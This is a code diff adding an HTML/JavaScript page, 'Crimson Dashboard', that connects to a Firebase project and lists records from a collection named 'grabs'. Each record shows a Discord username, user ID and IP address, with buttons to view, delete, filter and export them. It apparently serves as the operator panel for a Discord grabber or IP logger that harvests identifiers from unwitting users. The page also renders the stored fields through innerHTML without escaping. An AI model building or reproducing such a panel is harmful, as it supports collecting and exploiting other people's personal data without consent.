@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Crimson Dashboard</title>
+  <style>
+    :root {
+      --bg: #121212;
+      --fg: #e0f8d8;
+      --accent: #39ff14;
+      --tile-bg: #1e1e1e;
+      --shadow: rgba(0,0,0,0.6);
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: sans-serif;
+      background: var(--bg);
+      color: var(--fg);
+      padding: 1rem;
+    }
+    .controls {
+      display: flex;
+      flex-wrap: wrap;
+      gap: .5rem;
+      margin-bottom: 1rem;
+    }
+    .controls input,
+    .controls button {
+      padding: .5rem;
+      border: none;
+      border-radius: .5rem;
+      background: var(--tile-bg);
+      color: var(--fg);
+      box-shadow: 0 4px 6px var(--shadow);
+    }
+    .controls button {
+      cursor: pointer;
+      background: var(--accent);
+      color: #000;
+    }
+    #dashboard {
+      display: flex;
+      flex-direction: column;
+      gap: .75rem;
+    }
+    .tile {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: .75rem 1rem;
+      background: var(--tile-bg);
+      border-radius: .75rem;
+      box-shadow: 0 4px 6px var(--shadow);
+    }
+    .tile .info {
+      flex: 1;
+      display: flex;
+      gap: 1.5rem;
+      align-items: center;
+      font-size: .95rem;
+    }
+    .tile button {
+      margin-left: .5rem;
+    }
+    .tile button.view {
+      background: transparent;
+      border: 1px solid var(--accent);
+      color: var(--accent);
+    }
+    .tile button.del {
+      background: var(--accent);
+      color: #000;
+    }
+    /* Modal */
+    #modal {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.8);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+    }
+    #modal .content {
+      background: var(--tile-bg);
+      padding: 1rem;
+      border-radius: .75rem;
+      max-width: 90%;
+      max-height: 80%;
+      overflow-y: auto;
+      box-shadow: 0 6px 10px var(--shadow);
+      color: var(--fg);
+      white-space: pre-wrap;
+      font-family: monospace;
+    }
+    #modal .close {
+      position: absolute;
+      top: 1rem; right: 1rem;
+      background: var(--accent);
+      border: none;
+      border-radius: .5rem;
+      padding: .5rem;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="controls">
+    <input id="search" type="text" placeholder="Search username…">
+    <input id="date-from" type="date">
+    <input id="date-to"   type="date">
+    <button id="export">Export .txt</button>
+  </div>
+
+  <div id="dashboard"></div>
+
+  <div id="modal">
+    <button class="close">Close</button>
+    <div class="content"></div>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.17.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.17.2/firebase-firestore-compat.js"></script>
+  <script>
+    // ─── CONFIG ─────────────────────────────────────────
+    const firebaseConfig = {
+      apiKey: "AIzaSyDVYhiYuhrHRPYYzxq7LKPW8bf_2obXsiI",
+      authDomain: "crimson-66937.firebaseapp.com",
+      projectId: "crimson-66937",
+      storageBucket: "crimson-66937.firebasestorage.app",
+      messagingSenderId: "425261971902",
+      appId: "1:425261971902:web:d2fece6dee8e3e4c7be1ef"
+    };
+
+    // ─── INIT ────────────────────────────────────────────
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    let allData = [];
+
+    // ─── FETCH & RENDER ──────────────────────────────────
+    async function fetchData() {
+      const snap = await db.collection('grabs').orderBy('ts', 'desc').get();
+      allData = snap.docs.map(d => ({ id: d.id, ...d.data() }));
+      renderTiles(allData);
+    }
+
+    function renderTiles(data) {
+      const dash = document.getElementById('dashboard');
+      dash.innerHTML = '';
+      if (!data.length) {
+        dash.innerHTML = '<p>No records found.</p>';
+        return;
+      }
+      data.forEach(item => {
+        const tile = document.createElement('div');
+        tile.className = 'tile';
+        tile.innerHTML = `
+          <div class="info">
+            <span><strong>${item.discordUsername||'unknown'}</strong></span>
+            <span>${item.ip||'n/a'}</span>
+            <span>${item.discordUserId||'n/a'}</span>
+          </div>
+          <div class="actions">
+            <button class="view">view</button>
+            <button class="del">delete</button>
+          </div>
+        `;
+        // view
+        tile.querySelector('.view').onclick = () => openModal(JSON.stringify(item, null, 2));
+        // delete
+        tile.querySelector('.del').onclick = async () => {
+          if (!confirm('delete this record?')) return;
+          await db.collection('grabs').doc(item.id).delete();
+          fetchData();
+        };
+        dash.appendChild(tile);
+      });
+    }
+
+    // ─── SEARCH & FILTER ─────────────────────────────────
+    function applyFilters() {
+      const q = document.getElementById('search').value.toLowerCase();
+      const from = document.getElementById('date-from').value;
+      const to   = document.getElementById('date-to').value;
+      let filtered = allData.filter(item => {
+        const name = (item.discordUsername||'').toLowerCase();
+        if (q && !name.includes(q)) return false;
+        if (from && new Date(item.ts.toDate()) < new Date(from)) return false;
+        if (to   && new Date(item.ts.toDate()) > new Date(to + 'T23:59')) return false;
+        return true;
+      });
+      renderTiles(filtered);
+    }
+
+    document.getElementById('search').addEventListener('input', applyFilters);
+    document.getElementById('date-from').addEventListener('change', applyFilters);
+    document.getElementById('date-to').addEventListener('change', applyFilters);
+
+    // ─── EXPORT ──────────────────────────────────────────
+    document.getElementById('export').onclick = () => {
+      const text = JSON.stringify(
+        allData.filter(item => {
+          // replicate current filter logic
+          const q = document.getElementById('search').value.toLowerCase();
+          const from = document.getElementById('date-from').value;
+          const to   = document.getElementById('date-to').value;
+          if (q && !(item.discordUsername||'').toLowerCase().includes(q)) return false;
+          if (from && new Date(item.ts.toDate()) < new Date(from)) return false;
+          if (to   && new Date(item.ts.toDate()) > new Date(to + 'T23:59')) return false;
+          return true;
+        }),
+        null, 2
+      );
+      const blob = new Blob([text], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'export.txt';
+      a.click();
+      URL.revokeObjectURL(url);
+    };
+
+    // ─── MODAL ───────────────────────────────────────────
+    function openModal(content) {
+      document.querySelector('#modal .content').textContent = content;
+      document.getElementById('modal').style.display = 'flex';
+    }
+    document.querySelector('#modal .close').onclick = () => {
+      document.getElementById('modal').style.display = 'none';
+    };
+
+    // ─── ON LOAD ─────────────────────────────────────────
+    window.addEventListener('load', fetchData);
+  </script>
+</body>
+</html>
